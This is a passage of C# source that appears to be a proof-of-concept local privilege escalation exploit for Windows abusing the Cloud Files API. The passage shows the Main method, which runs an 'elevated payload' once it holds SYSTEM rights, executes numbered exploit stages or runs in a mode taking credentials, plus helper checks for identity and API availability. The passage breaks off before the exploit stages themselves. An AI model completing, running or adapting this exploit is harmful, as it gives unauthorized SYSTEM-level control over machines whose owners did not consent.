    static class Program
    {
        static void Main(string[] args)
        {
            Logger.Info("=== Windows Privilege Escalation PoC Started ===");
            Logger.Info($"Process ID: {Process.GetCurrentProcess().Id}");

            try
            {
                // Check if running as SYSTEM
                bool isSystem = CheckIfRunningAsSystem();

                if (isSystem)
                {
                    Logger.Info("Running as SYSTEM - executing elevated payload");
                    ExecuteElevatedPayload();
                    return;
                }

                // Verify Cloud Files API is available
                VerifyCloudFilesApi();

                // Parse command line arguments
                if (args.Length <= 1)
                {
                    int stage = args.Length > 0 ? int.Parse(args[0]) : 0;
                    ExecuteExploitStage(stage);
                }
                else
                {
                    // Alternative execution mode with credentials
                    ExecuteWithCredentials(args[0], args[1]);
                }
            }
            catch (Exception ex)
            {
                Logger.Critical("Fatal error in main execution", ex);
                Environment.Exit(1);
            }

            Logger.Info("=== Execution completed ===");
        }

        private static bool CheckIfRunningAsSystem()
        {
            try
            {
                using (var identity = System.Security.Principal.WindowsIdentity.GetCurrent())
                {
                    bool isSystem = identity.IsSystem;
                    Logger.Info($"Current identity: {identity.Name} (IsSystem: {isSystem})");
                    return isSystem;
                }
            }
            catch (Exception ex)
            {
                Logger.Error("Failed to check current identity", ex);
                throw;
            }
        }

        private static void VerifyCloudFilesApi()
        {
            try
            {
                Logger.Debug("Verifying Cloud Files API availability");
                NativeInterop.CfGetPlatformInfo(out NativeInterop.CF_PLATFORM_INFO platformInfo).CheckHResult();
                Logger.Info($"Cloud Files API available - Build: {platformInfo.BuildNumber}");
            }
            catch (Exception ex)
            {
                Logger.Critical("Cloud Files API not available", ex);
